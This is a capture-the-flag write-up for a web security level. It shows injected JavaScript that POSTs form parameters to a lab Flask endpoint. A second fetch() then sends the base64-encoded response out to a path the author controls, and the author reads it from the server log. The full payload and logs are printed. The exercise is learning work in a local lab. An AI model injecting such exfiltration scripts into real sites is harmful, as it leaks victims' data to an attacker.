# HTTP FORMS (JAVASCRIPT)


In this level I had to use `fetch()` to make a POST request to `/challenge/server` with the necessary form parameters, and then get the response back out to myself. After reading up on how to pass advanced arguments to `fetch()`, specifically the options object that lets you set the method and the request body, I took on the challenge.

I started by opening up `/challenge/server` to see what the server actually expected. The endpoint was:

```
@app.route("/hack", methods=["POST"])
```

and the parameters it checked for were:

```
if flask.request.form.get("access", None) != "mldjdjmb":
flask.abort(403, "Incorrect value for post parameter access!")
if flask.request.form.get("authcode", None) != "jvcmqone":
flask.abort(403, "Incorrect value for post parameter authcode!")
if flask.request.form.get("auth_pass", None) != "msoaqhla":
flask.abort(403, "Incorrect value for post parameter auth_pass!")
```

Three parameters, all checked against hardcoded values, and every one of them read out of `flask.request.form`, which is the detail that ended up mattering later.

In my first attempt I was able to get the majority of things right, such as the endpoint and exfiltrating the base64 encoded flag using

```
.then(data => { fetch("http://challenge.localhost:80/~hacker/solve.html?leak=" + btoa(data)) })
```

after extracting the data with

```
.then(response => response.text())
```

The idea behind that second `fetch()` is that the response body never gets displayed anywhere I can see, so instead I make the browser fire off a second request to a path I control, with the response smuggled into the query string. The server's request log then shows me the contents. I wrapped it in `btoa()` to base64 encode it first, so that newlines, spaces and any other characters that would break a URL get flattened into something URL-safe.

However, the parameters I had passed were apparently not correct, because the server request log said:

```
127.0.0.1 - - [25/Aug/2026 08:14:07] "GET /~hacker/solve.html HTTP/1.1" 200 -
127.0.0.1 - - [25/Aug/2026 08:14:07] "GET /hack?access=mldjdjmb&authcode=jvcmqone&auth_pass=msoaqhla HTTP/1.1" 405 -
127.0.0.1 - - [25/Aug/2026 08:14:07] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [25/Aug/2026 08:14:07] "GET /~hacker/solve.html?leak=PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ZW4+Cjx0aXRsZT40MDUgTWV0aG9kIE5vdCBBbGxvd2VkPC90aXRsZT4KPGgxPk1ldGhvZCBOb3QgQWxsb3dlZDwvaDE+CjxwPlRoZSBtZXRob2QgaXMgbm90IGFsbG93ZWQgZm9yIHRoZSByZXF1ZXN0ZWQgVVJMLjwvcD4K HTTP/1.1" 200 -
```

The exfiltration itself worked perfectly, the leak came back fine, it just wasn't carrying a flag. Decoding that base64 blob gave me a `405 Method Not Allowed` page, which lines up exactly with the `405` on the `/hack` line above.

After reviewing the issue I realised that I passed the parameters as a query string instead of passing them to the form using JavaScript syntax. That's also why the request went out as a `GET` — I had stuffed everything into the URL, so there was no body and no reason for the browser to treat it as a POST. Since the route is registered with `methods=["POST"]` only, Flask rejected it before any of the parameter checks ever ran. Even if the method had been right, a query string lands in `flask.request.args`, not `flask.request.form`, so the three checks would still have failed.

So, after implementing my code:

```JavaScript
<script>
fetch("http://challenge.localhost:80/hack", {
method: "POST",
body: new URLSearchParams({
access: "mldjdjmb",
authcode: "jvcmqone",
auth_pass: "msoaqhla",
})
})
.then(response => response.text())
.then(data => {fetch("http://challenge.localhost:80/~hacker/solve.html?leak=" + btoa(data))})
</script>
```

Two things changed here. `method: "POST"` makes the request match the route, and `body: new URLSearchParams({...})` puts the parameters in the request body instead of the URL. `URLSearchParams` is what makes this work cleanly, when you pass it as a body, the browser automatically sets the `Content-Type` to `application/x-www-form-urlencoded`, which is exactly the format Flask parses into `flask.request.form`.

This resulted in giving me the base64 encoded flag (because of `btoa(data)`). After decoding it using `base64 -d` I was able to solve the challenge.

